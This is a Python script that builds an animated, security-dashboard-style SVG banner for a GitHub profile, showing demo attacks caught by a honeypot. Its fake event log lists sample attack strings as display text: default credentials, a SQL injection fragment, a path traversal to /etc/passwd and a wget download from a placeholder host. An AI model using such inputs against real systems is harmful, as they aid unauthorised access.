"""Generate live-monitor.svg: an animated (SMIL only, no JS) SOC-style header for the GitHub profile."""
import random, sys
random.seed(7)

sys.path.insert(0, __import__("os").path.dirname(__file__))
from worldmap import LAND
W, H = 1100, 505+62
MX, MY, MW = 34, 92+62, 610          # map panel origin / width
LON0, LON1, LAT0, LAT1 = -170, 180, 80, -58
K = MW / (LON1 - LON0)
MH = (LAT0 - LAT1) * K

def xy(lat, lon):
    return MX + (lon - LON0) * K, MY + (LAT0 - lat) * K

def land(lat, lon):
    row = int(round(lat / 5) * 5)
    return any(a <= lon <= b for a, b in LAND.get(row, []))

MONO = "ui-monospace,'JetBrains Mono','SF Mono','Cascadia Code',Consolas,monospace"
o = []
a = o.append
a(f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {W} {H}" width="{W}" height="{H}" role="img" '
  'aria-label="Live security monitor: demo attacks from around the world are caught by Jay Lalkiya\'s GullakTrap honeypot in Ahmedabad">')
a('<title>Jay Lalkiya - live security monitor</title>')
a('<defs>'
  '<radialGradient id="glow"><stop offset="0" stop-color="#4ade80" stop-opacity=".55"/><stop offset="1" stop-color="#4ade80" stop-opacity="0"/></radialGradient>'
  '<linearGradient id="scan" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#4ade80" stop-opacity="0"/><stop offset="1" stop-color="#4ade80" stop-opacity=".09"/></linearGradient>'
  f'<clipPath id="logclip"><rect x="672" y="154" width="396" height="{MH+4:.0f}"/></clipPath>'
  f'<clipPath id="all"><rect width="{W}" height="{H}" rx="14"/></clipPath>'
  '</defs>')
a('<g clip-path="url(#all)">')
a(f'<rect width="{W}" height="{H}" fill="#060b12"/>')
# grid
for gx in range(0, W, 40):
    a(f'<line x1="{gx}" y1="0" x2="{gx}" y2="{H}" stroke="#0c1622" stroke-width="1"/>')
for gy in range(0, H, 40):
    a(f'<line x1="0" y1="{gy}" x2="{W}" y2="{gy}" stroke="#0c1622" stroke-width="1"/>')

# top bar
a(f'<rect x="0" y="0" width="{W}" height="114" fill="#0a121d"/><line x1="0" y1="114" x2="{W}" y2="114" stroke="#1d2a3a"/>')
NAME = f'font-family="{MONO}" font-size="46" font-weight="800" letter-spacing="4"'
a(f'<text x="34" y="60" {NAME} fill="#ff2e63" opacity=".8">JAY LALKIYA<animateTransform attributeName="transform" type="translate" values="0 0;-4 1;3 -1;0 0;0 0;-2 0;0 0" keyTimes="0;.04;.08;.12;.7;.73;1" calcMode="discrete" dur="3s" repeatCount="indefinite"/></text>')
a(f'<text x="34" y="60" {NAME} fill="#08d9d6" opacity=".8">JAY LALKIYA<animateTransform attributeName="transform" type="translate" values="0 0;4 -1;-3 1;0 0;0 0;2 1;0 0" keyTimes="0;.04;.08;.12;.7;.73;1" calcMode="discrete" dur="3s" repeatCount="indefinite"/></text>')
a(f'<text x="34" y="60" {NAME} fill="#ffffff">JAY LALKIYA</text>')
a(f'<text x="36" y="92" font-family="{MONO}" font-size="15" fill="#4ade80" letter-spacing="1.5">CYBER SECURITY INTERN <tspan fill="#5b738f">//</tspan> SOC · BLUE TEAM · RED TEAM <tspan fill="#5b738f">//</tspan> AHMEDABAD, INDIA</text>')
a(f'<circle cx="905" cy="40" r="7" fill="#ff4d4d"><animate attributeName="opacity" values="1;.15;1" dur="1s" repeatCount="indefinite"/></circle>')
a(f'<text x="921" y="46" font-family="{MONO}" font-size="17" font-weight="700" fill="#ff6b6b" letter-spacing="3">LIVE</text>')
a(f'<rect x="896" y="62" width="180" height="26" rx="4" fill="#2a0d10" stroke="#ff4d4d"><animate attributeName="stroke-opacity" values="1;.2;1" dur=".8s" repeatCount="indefinite"/></rect>')
a(f'<text x="986" y="80" text-anchor="middle" font-family="{MONO}" font-size="12" font-weight="700" fill="#ff6b6b" letter-spacing="1.5">THREAT LEVEL: HIGH</text>')
a(f'<text x="896" y="104" font-family="{MONO}" font-size="10" fill="#5b738f" letter-spacing="1">SENSOR: GULLAKTRAP-01</text>')

# panels
a(f'<rect x="24" y="130" width="630" height="{MH+40:.0f}" rx="8" fill="#08111b" stroke="#1d2a3a"/>')
a(f'<rect x="664" y="130" width="412" height="{MH+40:.0f}" rx="8" fill="#08111b" stroke="#1d2a3a"/>')
a(f'<text x="38" y="148" font-family="{MONO}" font-size="11" fill="#6f87a3" letter-spacing="2">INCOMING ATTACKS · DEMO FEED</text>')
a(f'<text x="678" y="148" font-family="{MONO}" font-size="11" fill="#6f87a3" letter-spacing="2">EVENT LOG</text>')

# dot map
lat = LAT0
while lat >= LAT1:
    lon = LON0
    while lon <= LON1:
        if land(lat, lon):
            x, y = xy(lat, lon)
            a(f'<circle cx="{x:.1f}" cy="{y:.1f}" r="1.7" fill="#1e3a57"/>')
        lon += 3
    lat -= 3

HOME = xy(23.0, 72.6)
SRC = [("MOSCOW",55.7,37.6),("BEIJING",39.9,116.4),("SAO PAULO",-23.5,-46.6),("NEW YORK",40.7,-74),
       ("AMSTERDAM",52.4,4.9),("LAGOS",6.5,3.4),("SEOUL",37.5,127),("FRANKFURT",50.1,8.7),
       ("JAKARTA",-6.2,106.8),("LOS ANGELES",34,-118),("SYDNEY",-33.9,151.2),("TEHRAN",35.7,51.4),
       ("LONDON",51.5,-0.1),("TOKYO",35.7,139.7),("CAIRO",30,31.2),("TORONTO",43.7,-79.4),("MEXICO CITY",19.4,-99.1),
       ("NAIROBI",-1.3,36.8),("SINGAPORE",1.3,103.8),("KYIV",50.4,30.5),("BOGOTA",4.7,-74.1),("JOHANNESBURG",-26.2,28),
       ("ISTANBUL",41,29),("HANOI",21,105.8),("CHICAGO",41.9,-87.6),("PARIS",48.9,2.4),("LIMA",-12,-77),("RIYADH",24.7,46.7)]
COL = ["#ff4d4d","#ffb547","#ff4d4d","#ff7a45","#ffb547","#ff4d4d"]
hx, hy = HOME
for i, (name, la, lo) in enumerate(SRC):
    sx, sy = xy(la, lo)
    mx, my = (sx + hx) / 2, min(sy, hy) - abs(sx - hx) * 0.28 - 20
    path = f"M{sx:.1f},{sy:.1f} Q{mx:.1f},{my:.1f} {hx:.1f},{hy:.1f}"
    c = COL[i % len(COL)]
    dur = 1.5 + (i % 5) * 0.3
    b2 = (i * 0.37) % 3
    begin = f"{b2:.2f}s"
    a(f'<path d="{path}" fill="none" stroke="{c}" stroke-opacity=".16" stroke-width="1.2"/>')
    # travelling comet: dashed stroke animated along the arc
    a(f'<path d="{path}" fill="none" stroke="{c}" stroke-width="2.2" stroke-linecap="round" pathLength="100" '
      f'stroke-dasharray="12 100" stroke-dashoffset="12" opacity="0">'
      f'<animate attributeName="stroke-dashoffset" values="12;-100" dur="{dur}s" begin="{begin}" repeatCount="indefinite"/>'
      f'<animate attributeName="opacity" values="0;1;1;0" keyTimes="0;.05;.85;1" dur="{dur}s" begin="{begin}" repeatCount="indefinite"/></path>')
    a(f'<path d="{path}" fill="none" stroke="{c}" stroke-width="2" stroke-linecap="round" pathLength="100" '
      f'stroke-dasharray="8 100" stroke-dashoffset="8" opacity="0">'
      f'<animate attributeName="stroke-dashoffset" values="8;-100" dur="{dur}s" begin="{b2+dur/2:.2f}s" repeatCount="indefinite"/>'
      f'<animate attributeName="opacity" values="0;1;1;0" keyTimes="0;.05;.85;1" dur="{dur}s" begin="{b2+dur/2:.2f}s" repeatCount="indefinite"/></path>')
    a(f'<circle cx="{sx:.1f}" cy="{sy:.1f}" r="3" fill="{c}"><animate attributeName="r" values="2;4.5;2" dur="{dur}s" begin="{begin}" repeatCount="indefinite"/></circle>')
    if i in (0,1,2,3,9,10,13,16,22):
        a(f'<text x="{sx+6:.1f}" y="{sy-6:.1f}" font-family="{MONO}" font-size="8.5" fill="#5b738f">{name}</text>')

# home node: shield pulse
for k in range(3):
    a(f'<circle cx="{hx:.1f}" cy="{hy:.1f}" r="6" fill="none" stroke="#4ade80" stroke-width="1.5">'
      f'<animate attributeName="r" values="6;34" dur="2.4s" begin="{k*0.8}s" repeatCount="indefinite"/>'
      f'<animate attributeName="opacity" values=".9;0" dur="2.4s" begin="{k*0.8}s" repeatCount="indefinite"/></circle>')
for k in range(4):
    a(f'<circle cx="{hx:.1f}" cy="{hy:.1f}" r="4" fill="none" stroke="#ff4d4d" stroke-width="2">'
      f'<animate attributeName="r" values="4;18" dur=".7s" begin="{k*0.55}s" repeatCount="indefinite"/>'
      f'<animate attributeName="opacity" values="1;0" dur=".7s" begin="{k*0.55}s" repeatCount="indefinite"/></circle>')
a(f'<circle cx="{hx:.1f}" cy="{hy:.1f}" r="26" fill="url(#glow)"/>')
POPS = ["BLOCKED: SSH brute force","BLOCKED: SQL injection","TRAPPED: telnet bot","BLOCKED: port scan","TRAPPED: malware drop","BLOCKED: path traversal"]
n = len(POPS)
for k, txt in enumerate(POPS):
    vis = ";".join("1" if m == k else "0" for m in range(n)) + ";" + ("1" if k == 0 else "0")
    kt = ";".join(f"{m/n:.3f}" for m in range(n)) + ";1"
    a(f'<g opacity="{1 if k == 0 else 0}"><animate attributeName="opacity" values="{vis}" keyTimes="{kt}" calcMode="discrete" dur="{n*1.2}s" repeatCount="indefinite"/>'
      f'<rect x="{hx-150:.1f}" y="{hy-58:.1f}" width="172" height="22" rx="4" fill="#2a0d10" stroke="#ff4d4d"/>'
      f'<text x="{hx-142:.1f}" y="{hy-43:.1f}" font-family="{MONO}" font-size="10.5" font-weight="700" fill="#ff8080">! {txt}</text></g>')
a(f'<circle cx="{hx:.1f}" cy="{hy:.1f}" r="6" fill="#4ade80"/>')
a(f'<rect x="{hx+10:.1f}" y="{hy+6:.1f}" width="118" height="30" rx="4" fill="#0a1a12" stroke="#1f5f3a"/>')
a(f'<text x="{hx+17:.1f}" y="{hy+19:.1f}" font-family="{MONO}" font-size="10" font-weight="700" fill="#4ade80">AHMEDABAD · HOME</text>')
a(f'<text x="{hx+17:.1f}" y="{hy+31:.1f}" font-family="{MONO}" font-size="9" fill="#8fd9a8">all attacks caught</text>')

# scrolling log (two identical blocks for a seamless loop)
EV = [("#ff6b6b","SSH","brute force","root:admin123"),("#ffb547","FTP","login try","anonymous"),
      ("#ff6b6b","HTTP","sqli","' OR 1=1--"),("#ffb547","TELNET","login","admin:admin"),
      ("#4ade80","BLOCK","source banned","fw rule +1"),("#ff6b6b","SMB","scan","tcp/445"),
      ("#ffb547","SNMP","probe","public"),("#4ade80","LOG","ATT&CK","T1110"),
      ("#ff6b6b","SSH","cmd","wget http://x/b.sh"),("#4ade80","LOG","ATT&CK","T1105"),
      ("#ffb547","SMTP","relay test","open?"),("#ff6b6b","HTTP","path trav","../../etc/passwd")]
lines = []
t = 9 * 3600 + 41 * 60
for i in range(18):
    c, svc, what, det = EV[(i * 5) % len(EV)]
    ipa = f"{random.choice([185,45,103,91,203,77,194,61])}.{random.randint(1,254)}.{random.randint(1,254)}.x"
    t += random.randint(1, 9)
    ts = f"{t//3600:02d}:{t//60%60:02d}:{t%60:02d}"
    lines.append((c, ts, svc, ipa, what, det))
LH = 17
block = len(lines) * LH
a('<g clip-path="url(#logclip)"><g>')
a(f'<animateTransform attributeName="transform" type="translate" from="0 0" to="0 -{block}" dur="{len(lines)*1.1:.1f}s" repeatCount="indefinite"/>')
for rep in range(2):
    for j, (c, ts, svc, ipa, what, det) in enumerate(lines):
        y = 170 + (rep * len(lines) + j) * LH
        det = det.replace("&", "&amp;").replace("<", "&lt;").replace("'", "&#39;")
        what = what.replace("&", "&amp;")
        a(f'<text x="678" y="{y}" font-family="{MONO}" font-size="11" fill="#5b738f">{ts} '
          f'<tspan fill="{c}" font-weight="700">{svc:<6}</tspan> <tspan fill="#c6d4e3">{ipa:<16}</tspan> '
          f'<tspan fill="#8fa3ba">{what} {det}</tspan></text>')
a('</g></g>')

# stats
SY = 130 + MH + 56
stats = [("ATTEMPTS CAUGHT", ["1,284","1,291","1,297","1,304","1,312","1,319"], "#ffffff"),
         ("DECOY SERVICES", ["7"], "#ffffff"),
         ("ATT&amp;CK MAPPED", ["100%"], "#4ade80"),
         ("REAL SYSTEMS HIT", ["0"], "#4ade80")]
tw = (W - 48 - 3 * 12) / 4
for i, (lab, vals, col) in enumerate(stats):
    x = 24 + i * (tw + 12)
    a(f'<rect x="{x:.1f}" y="{SY:.1f}" width="{tw:.1f}" height="70" rx="8" fill="#08111b" stroke="#1d2a3a"/>')
    a(f'<text x="{x+16:.1f}" y="{SY+24:.1f}" font-family="{MONO}" font-size="10.5" fill="#6f87a3" letter-spacing="1.5">{lab}</text>')
    if len(vals) == 1:
        a(f'<text x="{x+16:.1f}" y="{SY+56:.1f}" font-family="{MONO}" font-size="26" font-weight="700" fill="{col}">{vals[0]}</text>')
    else:
        n = len(vals)
        for k, v in enumerate(vals):
            vis = ";".join("1" if m == k else "0" for m in range(n)) + ";" + ("1" if k == 0 else "0")
            kt = ";".join(f"{m/n:.3f}" for m in range(n)) + ";1"
            a(f'<text x="{x+16:.1f}" y="{SY+56:.1f}" font-family="{MONO}" font-size="26" font-weight="700" fill="{col}" opacity="{1 if k==0 else 0}">{v}'
              f'<animate attributeName="opacity" values="{vis}" keyTimes="{kt}" calcMode="discrete" dur="{n*1.5}s" repeatCount="indefinite"/></text>')
# threat bar in first tile
a(f'<rect x="{24+tw-70:.1f}" y="{SY+44:.1f}" width="54" height="6" rx="3" fill="#1d2a3a"/>')
a(f'<rect x="{24+tw-70:.1f}" y="{SY+44:.1f}" width="20" height="6" rx="3" fill="#ff6b6b"><animate attributeName="width" values="14;54;30;46;14" dur="4s" repeatCount="indefinite"/></rect>')

# footer line
FY = SY + 104
a(f'<text x="34" y="{FY}" font-family="{MONO}" font-size="14" fill="#8fa3ba"><tspan fill="#4ade80">&#9656;</tspan> CodeAlpha certified   <tspan fill="#4ade80">&#9656;</tspan> Red team intern @ CyArt Tech   <tspan fill="#4ade80">&#9656;</tspan> <tspan fill="#ffffff" font-weight="700">OPEN TO SOC ANALYST ROLES</tspan></text>')
a(f'<rect x="702" y="{FY-13}" width="9" height="17" fill="#4ade80"><animate attributeName="opacity" values="1;0;1" dur="1s" calcMode="discrete" repeatCount="indefinite"/></rect>')

# scanline sweeping down the whole screen
a(f'<rect x="0" y="-120" width="{W}" height="120" fill="url(#scan)"><animate attributeName="y" values="-120;{H}" dur="6s" repeatCount="indefinite"/></rect>')
a(f'<rect x="0.5" y="0.5" width="{W-1}" height="{H-1}" rx="14" fill="none" stroke="#1d2a3a"/>')
a('</g></svg>')

svg = "\n".join(o)
svg = svg.replace(f'height="{H}" role', f'height="{H}" role')
open(sys.argv[1], "w", encoding="utf-8").write(svg)
print("H used:", FY + 20, "of", H, "bytes", len(svg))
